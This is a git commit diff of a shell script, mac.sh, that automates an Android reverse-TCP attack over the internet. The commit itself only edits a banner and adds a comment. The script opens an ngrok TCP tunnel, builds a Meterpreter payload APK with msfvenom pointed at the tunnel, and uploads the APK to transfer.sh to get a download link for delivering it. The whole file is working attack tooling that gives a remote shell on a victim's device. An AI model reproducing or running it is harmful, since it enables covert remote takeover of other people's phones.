397145b7b556e6e8dc33d6db3c371e69f66e4f50
Arun Chaudhary <arun.11601678@lpu.in>
2018-02-12 16:37:10 +0530

    Update mac.sh

--- mac.sh
+++ mac.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
 osascript -e 'tell application "Terminal" to do script "cd '$(pwd)';./ngrok tcp 4569"'
 clear
-printf "\033[1;31m*** Android Reverse TCP over WAN using NGROK ***\033[0m\n"
+printf "\033[1;31m*** Reverse TCP over WAN using NGROK ***\033[0m\n"
 echo -e "\t*** https://github.com/its-arun ***"
 sleep 3.5;
 #Change value pload to use different reverse_tcp payload
 pload=android/meterpreter/reverse_tcp;
 rport=$( curl -sS http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | cut -d ":" -f 3 | sed 's/\"//g' );
+#also make changes in the following command according to your payload
 msfvenom -p $pload LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
 echo "Payload Generated";
 ulink=$( curl -sS --upload-file ./payload.apk https://transfer.sh/payload.apk );
